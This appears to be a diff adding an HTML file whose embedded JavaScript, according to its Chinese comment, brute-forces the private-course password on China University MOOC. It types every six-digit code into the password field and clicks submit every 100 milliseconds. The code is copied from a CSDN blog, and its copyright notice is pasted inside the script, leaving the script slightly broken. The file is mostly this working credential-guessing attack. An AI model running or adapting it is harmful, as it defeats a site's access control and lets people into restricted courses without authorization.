@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>// 中国大学MOOC学校专有课程密码破解
+
+        start = 0;
+        end = Math.pow(10,6);
+        size = 6;
+        
+        
+        p = document.getElementsByClassName("ux-input_base")[0];
+        j = document.getElementsByClassName("ux-btn")[1];
+        
+        window.inputValue = function (dom, st) {
+            var evt = new InputEvent('input', {
+                inputType: 'insertText',
+                data: st,
+                dataTransfer: null,
+                isComposing: false
+            });
+            dom.value = st;
+            dom.dispatchEvent(evt);
+        }
+        
+        window.mClick = function (dom) {
+            var event = new MouseEvent('click', {
+                view: window,
+                bubbles: true,
+                cancelable: true
+            });
+            dom.dispatchEvent(event)
+        }
+        
+        // for(i=start;i<end;i++){
+        // 		num = (Array(size+1).join("0") + i).slice(-size)
+        // 		console.log("当前任务：",num)
+        // 		inputValue( p,num )
+        // 		j.dispatchEvent(event)
+        // }
+        
+        i=start;
+        iVal = setInterval(()=>{
+            console.log("当前任务：",num)
+            num = (Array(size+1).join("0") + i).slice(-size);
+            inputValue( p,num )
+            mClick(j)
+            i++;
+            if(i==end){
+                clearInterval( iVal )
+            }
+        },100)
+        
+        // clearInterval(iVal)
+        ————————————————
+        版权声明：本文为CSDN博主「林毅洋」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
+        原文链接：https://blog.csdn.net/kajweb/article/details/104392889</script>
+</body>
+</html>
